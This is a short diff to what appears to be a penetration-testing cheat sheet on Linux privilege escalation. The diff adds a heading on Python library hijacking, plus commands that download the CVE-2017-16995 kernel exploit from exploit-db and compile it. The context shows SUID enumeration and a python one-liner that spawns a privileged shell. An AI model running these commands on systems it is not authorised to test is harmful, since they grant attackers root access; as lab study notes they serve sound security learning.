@@ -14,7 +14,7 @@ OUPUT:
 ## Privilege Escalation
 getcap -r / 2>/dev/null
 
-
+Python Library Hijacking on Linux
 
 [SUID] find / -perm /4000 2>/dev/null
     - [python] <python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'>
@@ -38,3 +38,8 @@ find / -perm -u=s -type f 2>/dev/null
 - PowerSploit
 - Weewly
 - dns2tcp
+
+
+[cve-2017-16995]
+    wget https://www.exploit-db.com/download/45010 -O cve-2017-16995.c
+    gcc --static cve-2017-16995.c -o cve-2017-16995    
